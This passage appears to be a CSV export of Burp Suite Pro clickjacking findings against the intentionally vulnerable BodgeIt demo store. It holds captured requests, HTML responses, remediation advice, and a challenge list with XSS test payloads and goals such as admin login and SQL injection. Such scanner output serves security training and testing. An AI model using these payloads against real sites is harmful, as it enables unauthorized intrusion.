href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a></td> <td style=""text-align: center"">&nbsp;<a href=""#"" onclick=""decQuantity(28);""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity_28"" name=""quantity_28"" value=""11"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity(28);""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp;</td> <td align=""right"">$2.45</td> </td><td align=""right"">$26.95</td> </tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$26.95</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","68","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/contact.jsp","","","http://localhost:8080/bodgeit/contact.jsp","","GET /bodgeit/contact.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2342 Date: Mon, 28 Mar 2016 20:11:03 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.984290394814531""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","52","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/home.jsp","","","http://localhost:8080/bodgeit/home.jsp","","GET /bodgeit/home.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3197 Date: Mon, 28 Mar 2016 20:11:04 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=31"">Youknowwhat</a></td><td>Whatchamacallits</td><td align=""right"">$4.32</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=21"">Whatsit sound like</a></td><td>Whatsits</td><td align=""right"">$2.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=7"">Thingie 4</a></td><td>Thingies</td><td align=""right"">$3.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=3"">Weird Widget</a></td><td>Widgets</td><td align=""right"">$4.70</td> </tr> <tr> <td><a href=""product.jsp?prodid=25"">GZ K77</a></td><td>Gizmos</td><td align=""right"">$3.05</td> </tr> <tr> <td><a href=""product.jsp?prodid=16"">TGJ JJJ</a></td><td>Thingamajigs</td><td align=""right"">$0.80</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","46","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2462 Date: Mon, 28 Mar 2016 20:11:06 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","65","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/product.jsp","","","http://localhost:8080/bodgeit/product.jsp","","GET /bodgeit/product.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2279 Date: Mon, 28 Mar 2016 20:11:08 GMT Connection: close <script type=""text/javascript""> function incQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = --q.value; if (val < 1) { val = 1; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","50","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/login.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2485 Date: Mon, 28 Mar 2016 20:11:16 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","51","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/score.jsp","","","http://localhost:8080/bodgeit/score.jsp","","GET /bodgeit/score.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/about.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 4058 Date: Mon, 28 Mar 2016 20:11:17 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Score</h3> Here are at least some of the vulnerabilities that you can try and exploit:<br/><br/> <center><table class=""border"" width=""80%""> <tr><th>Challenge</th><th>Done?</th></tr> <tr> <td>Login as test@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as user1@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as admin@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find hidden content as a non admin user</td> <td> <img src=""images/152.png"" alt=""Completed"" title=""Completed"" border=""0""> </td> </tr> <tr> <td>Find diagnostic data</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 1: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 2: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Access someone elses basket</td> <td> <img src=""images/154.png"" alt=""Not implemented/tested yet :("" title=""Not implemented/tested yet :("" border=""0""> </td> </tr> <tr> <td>Get the store to owe you money</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Change your password via a GET request</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption, and display a popup using: &lt;script&gt;alert(""H@cked A3S"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption and append a list of table names to the normal results.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> </table></center> <br/> </td> </tr> </table> </td> </tr> </table> </center> </body> 